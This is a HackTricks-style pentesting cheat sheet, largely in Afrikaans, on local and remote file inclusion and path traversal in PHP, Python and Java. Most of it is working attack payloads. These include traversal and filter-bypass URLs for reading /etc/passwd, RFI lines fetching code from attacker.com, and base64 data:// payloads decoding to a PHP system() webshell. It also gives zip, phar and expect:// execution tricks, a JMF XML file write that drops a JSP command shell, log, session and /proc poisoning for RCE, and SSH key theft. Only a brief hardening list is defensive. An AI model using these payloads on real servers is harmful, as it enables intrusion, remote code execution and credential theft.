# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Die lêer word vanaf 'n afgeleë server gelaai (Beste: Jy kan die kode skryf en die server sal dit uitvoer). In php is dit **ongeskakel** per verstek (**allow_url_include**).\
**Local File Inclusion (LFI):** Die server laai 'n plaaslike lêer.

Die kwesbaarheid ontstaan wanneer die gebruiker op een of ander manier die lêer kan beheer wat deur die server gelaai gaan word.

Kwetsbare **PHP functions**: require, require_once, include, include_once

'n Interessante hulpmiddel om hierdie kwesbaarheid uit te buit: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Deur verskeie \*nix LFI-lyste te kombineer en meer paadjies by te voeg het ek hierdie een geskep:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Probeer ook om `/` na `\` te verander\
Probeer ook om `../../../../../` by te voeg

'n Lys wat verskeie tegnieke gebruik om die lêer /etc/password te vind (om te kontroleer of die kwesbaarheid bestaan) kan gevind word [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Samevoeging van verskillende woordlyste:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Probeer ook om `/` na `\` te verander\
Probeer ook om `C:/` te verwyder en `../../../../../` by te voeg

'n Lys wat verskeie tegnieke gebruik om die lêer /boot.ini te vind (om te kontroleer of die kwesbaarheid bestaan) kan gevind word [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Kyk na die LFI-lys van Linux.

## Basiese LFI en omseilings

Al die voorbeelde is vir Local File Inclusion maar kan ook op Remote File Inclusion toegepas word (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences geskrap nie-rekursief
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Om die byvoeging van ekstra karakters aan die einde van die gegewe string te omseil (omseiling van: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Dit is **opgelos sedert PHP 5.4**

### **Enkodering**

Jy kan nie-standaard enkoderinge gebruik soos double URL encode (en ander):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Van bestaande gids

Miskien kontroleer die back-end die gids-pad:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Verken lêerstelsel-gidse op 'n bediener

Die lêerstelsel van 'n bediener kan rekursief verken word om gidses, nie net lêers, te identifiseer deur sekere tegnieke te gebruik. Hierdie proses behels die bepaling van die gidsdiepte en die ondersoek na die bestaan van spesifieke vouers. Hieronder is 'n gedetailleerde metode om dit te bereik:

1. **Bepaal die gidsdiepte:** Bepaal die diepte van jou huidige gids deur suksesvol die `/etc/passwd`-lêer te haal (van toepassing as die bediener op Linux gebaseer is). 'n Voorbeeld-URL kan soos volg gestruktureer wees, wat 'n diepte van drie aandui:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Soek na vouers:** Voeg die naam van die vermoedlike gids (bv. `private`) by die URL en navigeer dan terug na `/etc/passwd`. Die ekstra gidsvlak vereis dat die diepte met een verhoog:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpreteer die Uitkomste:** Die server se reaksie dui aan of die gids bestaan:
- **Fout / Geen Uitset:** Die gids `private` bestaan waarskynlik nie by die gespesifiseerde ligging nie.
- **Inhoud van `/etc/passwd`:** Die teenwoordigheid van die `private` gids is bevestig.
4. **Rekursiewe Verkenning:** Ontdekte gidse kan verder ondersoek word vir subgidse of lêers met dieselfde tegniek of tradisionele Local File Inclusion (LFI)-metodes.

Om gidse in ander plekke van die lêerstelsel te verken, pas die payload dienooreenkomstig aan. Byvoorbeeld, om te kontroleer of `/var/www/` `n `private` gids bevat (aannemend die huidige gids is op 'n diepte van 3), gebruik:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation is 'n metode wat gebruik word om lêerpaaie in webtoepassings te manipuleer. Dit word dikwels gebruik om beperkte lêers te bereik deur sekere sekuriteitsmaatreëls te omseil wat ekstra karakters aan die einde van lêerpaaie heg. Die doel is om 'n lêerpad te skep wat, nadat dit deur die sekuriteitsmaatreël verander is, steeds na die gewenste lêer wys.

In PHP kan verskeie voorstellings van 'n lêerpad as ekwivalent beskou word weens die aard van die lêerstelsel. Byvoorbeeld:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, en `/etc/passwd/` word almal as dieselfde pad behandel.
- Wanneer die laaste 6 karakters `passwd` is, verander die toevoeging van 'n `/` (waardeur dit `passwd/` word) nie die geteikende lêer nie.
- Net so, as `.php` aan 'n lêerpad aangeheg word (bv. `shellcode.php`), sal die toevoeging van `/.` aan die einde nie die lêer wat bereik word verander nie.

Die gegewe voorbeelde wys hoe om path truncation te gebruik om toegang tot `/etc/passwd` te kry, 'n algemene teiken weens die sensitiewe inhoud daarvan (gebruikersrekeninginligting):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
In hierdie scenario's kan die aantal traversals wat benodig word ongeveer 2027 wees, maar hierdie getal kan wissel afhangende van die server se konfigurasie.

- **Using Dot Segments and Additional Characters**: Traversal-sekwensies (`../`) gekombineer met ekstra puntsegmente en karakters kan gebruik word om deur die lêerstelsel te navigeer, en daarmee aangehegte stringe deur die server effektief te ignoreer.
- **Determining the Required Number of Traversals**: Deur proef en fout kan 'n mens die presiese aantal `../`-reekse vind wat benodig word om na die root-gids te navigeer en dan na `/etc/passwd`, en sodoende enige aangehegte stringe (soos `.php`) te neutraliseer terwyl die verlangde pad (`/etc/passwd`) ongeskonde bly.
- **Starting with a Fake Directory**: Dit is 'n algemene praktyk om die pad te begin met 'n nie-bestaande gids (soos `a/`). Hierdie tegniek word as 'n voorsorgmaatreël gebruik of om te voldoen aan die vereistes van die server se padparsingslogika.

When employing path truncation techniques, it's crucial to understand the server's path parsing behavior and filesystem structure. Each scenario might require a different approach, and testing is often necessary to find the most effective method.

**Hierdie kwesbaarheid is reggestel in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

In php is dit standaard uitgeschakel omdat **`allow_url_include`** op **Off.** gestel is. Dit moet op **On** wees om te werk, en in daardie geval kan jy 'n PHP-lêer vanaf jou bediener insluit en RCE kry:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
As om een of ander rede **`allow_url_include`** op **On** is, maar PHP is **filtering** toegang tot eksterne webblaaie, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), kan jy byvoorbeeld die data protocol met base64 gebruik om 'n b64 PHP-kode te decodeer en RCE te kry:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> In die vorige kode is die finale `+.txt` bygevoeg omdat die aanvaller 'n string benodig het wat op `.txt` eindig, dus die string daarmee eindig en na die b64 decode sal daardie deel net rommel teruggee en die werklike PHP-kode ingesluit word (en gevolglik uitgevoer).

Nog 'n voorbeeld **wat nie die `php://` protocol gebruik nie** sou wees:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Wortelelement

In python in 'n kode soos hierdie:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
As die gebruiker 'n **absolute pad** aan **`file_name`** deurgee, word die **vorige pad net verwyder**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Dit is die beoogde gedrag volgens [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> If a component is an absolute path, all previous components are thrown away and joining continues from the absolute path component.

## Java - lys van gidse

Dit lyk asof as jy 'n Path Traversal in Java het en jy **vra vir 'n gids** in plaas van 'n lêer, 'n **lys van die gids teruggegee** word. Dit sal nie in ander tale gebeur nie (sover ek weet).

## Top 25 parameters

Hier is 'n lys van die Top 25 parameters wat vatbaar kan wees vir local file inclusion (LFI) kwesbaarhede (van [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI gebruik van PHP wrappers & protokolle

### php://filter

PHP-filters laat toe om basiese **wysigingsoperasies op die data** uit te voer voordat dit gelees of geskryf word. Daar is 5 kategorieë filters:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Verwyder tags uit die data (alles tussen "<" en ">" karakters)
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Transformeer na 'n ander enkodering (`convert.iconv.<input_enc>.<output_enc>`). Om die **lys van alle enkoderinge** wat ondersteun word te kry, voer in die konsole uit: `iconv -l`

> [!WARNING]
> Deur die `convert.iconv.*` omskakelingsfilter te misbruik kan jy **arbitrêre teks genereer**, wat nuttig kan wees om arbitrêre teks te skryf of om 'n funksie soos include arbitrêre teks te laat verwerk. Vir meer inligting sien [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Komprimeer die inhoud (useful if exfiltrating a lot of info)
- `zlib.inflate`: Dekomprimeer die data
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Verouderd
- `mdecrypt.*` : Verouderd
- Other Filters
- As jy in PHP `var_dump(stream_get_filters());` uitvoer kan jy 'n paar **onverwagte filters** vind:
- `consumed`
- `dechunk`: keer HTTP chunked encoding om
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Die deel "php://filter" is nie-gevoelig vir hoof-/kleinletters nie

### Gebruik van php filters as oracle om ewekansige lêers te lees

[**In hierdie pos**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) word 'n tegniek voorgestel om 'n plaaslike lêer te lees sonder om die uitset van die bediener terug te kry. Hierdie tegniek is gebaseer op 'n **boolean exfiltration of the file (char by char) using php filters** as oracle. Dit is omdat php filters gebruik kan word om 'n teks groot genoeg te maak dat php 'n uitsondering gooi.

In die oorspronklike pos vind jy 'n gedetaileerde verduideliking van die tegniek, maar hier is 'n kort samevatting:

- Gebruik die codec **`UCS-4LE`** om die voorste karakter van die teks by die begin te laat en die stringgrootte eksponensieel te laat groei.
- Dit sal gebruik word om 'n **teks te genereer wat so groot is dat, as die aanvanklike letter korrek geraai word, php 'n **error** sal veroorsaak**.
- Die **dechunk** filter sal **alles verwyder as die eerste char nie 'n hexadecimal is nie**, sodat ons kan weet of die eerste char hex is.
- Dit, gekombineer met die vorige een (en ander filters afhangende van die geraaide letter), sal ons toelaat om 'n letter aan die begin van die teks te raai deur te kyk wanneer ons genoeg transformasies doen sodat dit nie meer 'n hexadecimal karakter is nie. Want as dit hex is, sal dechunk dit nie verwyder nie en die aanvanklike bom sal 'n php error veroorsaak.
- Die codec **convert.iconv.UNICODE.CP930** verander elke letter na die volgende een (dus na hierdie codec: a -> b). Dit laat ons byvoorbeeld ontdek of die eerste letter 'n `a` is omdat as ons 6 keer hierdie codec toe pas a->b->c->d->e->f->g die letter nie meer 'n hexadecimal karakter is nie, dus verwyder dechunk dit nie en word die php error getrigger omdat dit met die aanvanklike bom vermenigvuldig.
- Deur ander transformasies soos **rot13** aan die begin te gebruik, is dit moontlik om ander karakters te leak soos n, o, p, q, r (en ander codecs kan gebruik word om ander letters na die hex-reeks te skuif).
- Wanneer die aanvanklike char 'n nommer is, moet dit base64 encode word en die eerste 2 letters geleak word om die nommer te leak.
- Die finale probleem is om te sien **hoe om meer as die aanvanklike letter te leak**. Deur volgorde-memory filters soos **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** te gebruik, is dit moontlik om die volgorde van die karakters te verander en ander letters van die teks in die eerste posisie te kry.
- En om in staat te wees om **further data** te bekom, is die idee om **2 bytes rommeldata aan die begin te genereer** met **convert.iconv.UTF16.UTF16**, **UCS-4LE** toe te pas om dit te laat **pivot with the next 2 bytes**, en **verwyder die data tot by die rommeldata** (dit sal die eerste 2 bytes van die aanvanklike teks verwyder). Gaan voort hiermee totdat jy by die verlangde deel kom om te leak.

In die pos is daar ook 'n hulpmiddel gelek om dit outomaties uit te voer: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Hierdie wrapper laat toe om by lêerbeskrywers te kom wat die proses oop het. Potensieel nuttig om die inhoud van geopende lêers te exfiltrate:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Jy kan ook gebruik maak van **php://stdin, php://stdout and php://stderr** om onderskeidelik toegang tot die **file descriptors 0, 1 and 2** te kry (ek is nie seker hoe dit in 'n aanval nuttig kan wees nie)

### zip:// and rar://

Laai 'n Zip- of Rar-lêer met 'n PHPShell daarin op en kry toegang daartoe.\
Om die rar protocol te kan misbruik, moet dit **spesifiek geaktiveer** word.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Neem kennis dat hierdie protokol beperk word deur php-konfigurasies **`allow_url_open`** en **`allow_url_include`**

### expect://

Expect moet geaktiveer wees. Jy kan kode hiermee uitvoer:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Spesifiseer jou payload in die POST-parameters:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

'n `.phar`-lêer kan gebruik word om PHP-kode uit te voer wanneer 'n webtoepassing funksies soos `include` gebruik vir lêerlaai. Die PHP-kodefragment hieronder toon die skepping van 'n `.phar`-lêer:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Om die `.phar`-lêer te kompileer, moet die volgende opdrag uitgevoer word:
```bash
php --define phar.readonly=0 create_path.php
```
Upon execution, a file named `test.phar` will be created, which could potentially be leveraged to exploit Local File Inclusion (LFI) vulnerabilities.

In cases where the LFI only performs file reading without executing the PHP code within, through functions such as `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, or `filesize()`, exploitation of a deserialization vulnerability could be attempted. This vulnerability is associated with the reading of files using the `phar` protocol.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Dit was moontlik om **any arbitrary file read from PHP that supports php filters** te misbruik om 'n RCE te kry. Die gedetailleerde beskrywing kan [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Baie kort opsomming: 'n **3 byte overflow** in die PHP-heap is misbruik om die **ketting van free chunks** van 'n spesifieke grootte te verander om sodoende **enigiets na enige adres te skryf**, dus is 'n hook bygevoeg om **`system`** aan te roep.\
Dit was moontlik om chunks van spesifieke groottes te alloc deur meer php filters te misbruik.

### Meer protokolle

Kyk na meer moontlike[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Skryf in geheue of in 'n tydelike lêer (nie seker hoe dit nuttig kan wees in a file inclusion attack nie)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Toegang tot plaaslike lêerstelsel
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Toegang tot HTTP(s) URLs
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Toegang tot FTP(s) URLs
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Kompressiestrome
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Vind paadjies wat by 'n patroon pas (Dit lewer niks uit wat drukbaar is nie, so nie regtig nuttig hier nie)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audiostreams (Nie nuttig om arbitrary files te lees nie)

## LFI via PHP's 'assert'

Local File Inclusion (LFI)-risiko's in PHP is besonder hoog wanneer daar met die 'assert' funksie gewerk word, wat kode binne strings kan uitvoer. Dit is veral problematies as insette wat directory traversal-karakters soos ".." bevat, gekontroleer word maar nie behoorlik gesanitiseer nie.

Byvoorbeeld, PHP-kode mag ontwerp wees om directory traversal soos volg te voorkom:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Terwyl dit daarop gemik is om traversal te stop, skep dit per ongeluk 'n vektor vir code injection. Om dit te misbruik om lêerinhoud te lees, kan 'n attacker gebruik:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Net so, vir die uitvoer van arbitrêre stelselopdragte, kan 'n mens gebruik:
```plaintext
' and die(system("id")) or '
```
Dit is belangrik om hierdie payloads te **URL-encode**.

## PHP Blind Path Traversal

> [!WARNING]
> Hierdie tegniek is relevant in gevalle waar jy die **lêerpad** van 'n **PHP-funksie** beheer wat 'n **lêer sal toegang** maar jy sal nie die inhoud van die lêer sien nie (soos 'n eenvoudige oproep na **`file()`**), maar die inhoud nie getoon word nie.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) word verduidelik hoe 'n blind path traversal deur PHP filters misbruik kan word om die inhoud van 'n lêer via 'n error oracle te **exfiltrate**.

Kortom, die tegniek gebruik die **"UCS-4LE" encoding** om die inhoud van 'n lêer so **groot** te maak dat die **PHP-funksie wat die lêer oopmaak** 'n **fout** sal veroorsaak.

Dan, om die eerste char te leak, word die filter **`dechunk`** gebruik saam met ander soos **base64** of **rot13**, en uiteindelik word die filters **convert.iconv.UCS-4.UCS-4LE** en **convert.iconv.UTF16.UTF-16BE** gebruik om ander chars aan die begin te plaas en daardie chars te leak.

Funksies wat dalk kwesbaar is: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Vir die tegniese besonderhede, kyk die genoemde post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

As server-side kode wat lêers insluk/oplaai die bestemming-pad bou met gebruiker-beheerde data (bv. 'n lêernaam of URL) sonder om dit te kanoniseer en te valideer, kan `..` segmente en absolute paadjies uit die beoogde gids ontsnap en 'n arbitrary file write veroorsaak. As jy die payload onder 'n web-geëksposeerde gids kan plaas, kry jy gewoonlik unauthenticated RCE deur 'n webshell neer te sit.

Tipiese uitbuitingstruktuur:
- Identifiseer 'n write primitive in 'n endpoint of background worker wat 'n pad/lêernaam aanvaar en inhoud na disk skryf (bv. message-driven ingestion, XML/JSON command handlers, ZIP extractors, ens.).
- Bepaal web-geëksposeerde gidse. Algemene voorbeelde:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Bou 'n traversal-pad wat uit die beoogde stoor-gids breek na die webroot, en sluit jou webshell-inhoud in.
- Blaai na die neergesette payload en voer opdragte uit.

Notas:
- Die kwesbare diens wat die skryf uitvoer kan na 'n non-HTTP-poort luister (bv. 'n JMF XML-luisteraar op TCP 4004). Die hoof webportaal (ander poort) sal later jou payload dien.
- Op Java-stakke word hierdie lêerskrywings dikwels geïmplementeer met eenvoudige `File`/`Paths` concatenation. Gebrek aan kanonisering/witlys is die kernfout.

Generiese XML/JMF-styl voorbeeld (produk-skemas verskil – die DOCTYPE/body wrapper is irrelevant vir die traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Verharding wat hierdie klas foute teenwerk:
- Los dit op na 'n kanoniese pad en dwing af dat dit binne 'n toegelate basisgids val.
- Weier enige pad wat `..`, absolute wortels, of skyfletters bevat; verkies gegenereerde lêernaam.
- Laat die skrywer as 'n lae-bevoegdheidsrekening loop en skei skryfgidse van die geserveerde wortels.

## Remote File Inclusion

Soos vroeër verduidelik, [**volg hierdie skakel**](#remote-file-inclusion).

### Deur Apache/Nginx loglêer

As die Apache of Nginx-server **kwesbaar vir LFI** is in die include-funksie, kan jy probeer toegang te kry tot **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, die **user agent** of 'n **GET parameter** gebruik om 'n php shell soos **`<?php system($_GET['c']); ?>`** te plaas, en daardie lêer te include.

> [!WARNING]
> Let daarop dat **as jy dubbel aanhalingstekens gebruik** vir die shell in plaas van **enkele aanhalingstekens**, sal die dubbel aanhalingstekens verander word na die string "_**quote;**_", **PHP sal 'n fout gooi** daar en **niks anders sal uitgevoer word**.
>
> Maak ook seker dat jy die **payload reg skryf** of PHP sal elke keer 'n fout gee wanneer dit probeer om die loglêer te laai en jy sal nie 'n tweede geleentheid hê nie.

Dit kan ook in ander logs gedoen word maar **wees versigtig,** die kode binne die logs kan URL-geënkodeer wees en dit kan die Shell vernietig. Die header **authorisation "basic"** bevat "user:password" in Base64 en dit word in die logs gedekodeer. Die PHPShell kan binne hierdie header ingevoeg word.\
Ander moontlike logpade:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Via E-pos

**Stuur 'n e-pos** na 'n interne rekening (user@localhost) wat jou PHP payload bevat soos `<?php echo system($_REQUEST["cmd"]); ?>` en probeer die e-pos van die gebruiker insluit met 'n pad soos **`/var/mail/<USERNAME>`** of **`/var/spool/mail/<USERNAME>`**

### Via /proc/*/fd/*

1. Laai baie shells op (byvoorbeeld: 100)  
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), met $PID = PID van die proses (kan met brute force deurkraak word) en $FD = die lêerbeskrywer (kan ook met brute force deurkraak word)

### Via /proc/self/environ

Soos 'n loglêer, stuur die payload in die User-Agent; dit sal weerspieël word binne die /proc/self/environ-lêer
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via oplaai

As jy 'n lêer kan oplaai, injekteer net die shell payload daarin (bv.: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Om die lêer leesbaar te hou, is dit die beste om in die metadata van die foto's/doc/pdf in te voeg

### Via ZIP-lêer oplaai

Laai 'n ZIP-lêer op wat 'n PHP shell saamgepak bevat en kry toegang:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Deur PHP sessions

Kontroleer of die webwerf PHP Session (PHPSESSID) gebruik
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP word hierdie sessions gestoor in _/var/lib/php5/sess\\_\[PHPSESSID]\_ lêers
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Stel die cookie in op `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Gebruik die LFI om die PHP-sessie-lêer in te sluit
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Deur ssh

As ssh aktief is, kyk watter gebruiker gebruik word (/proc/self/status & /etc/passwd) en probeer toegang tot **\<HOME>/.ssh/id_rsa** kry.

### **Deur** **vsftpd** _**logs**_

Die logs vir die FTP-server vsftpd is geleë by _**/var/log/vsftpd.log**_. In die scenario waar 'n Local File Inclusion (LFI) kwesbaarheid bestaan, en toegang tot 'n blootgestelde vsftpd-bediener moontlik is, kan die volgende stappe oorweeg word:

1. Inject a PHP payload into the username field during the login process.
2. Na injeksie, gebruik die LFI om die bedienerlogs van _**/var/log/vsftpd.log**_ te onttrek.

### Deur php base64 filter (gebruik base64)

Soos getoon in [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) artikel, die PHP base64-filter ignoreer nie-base64-karakters. Jy kan dit gebruik om die lêeruitbreidingkontrole te omseil: as jy base64 verskaf wat eindig met ".php", sal dit die "." ignoreer en "php" by die base64 heg. Hier is 'n voorbeeld payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

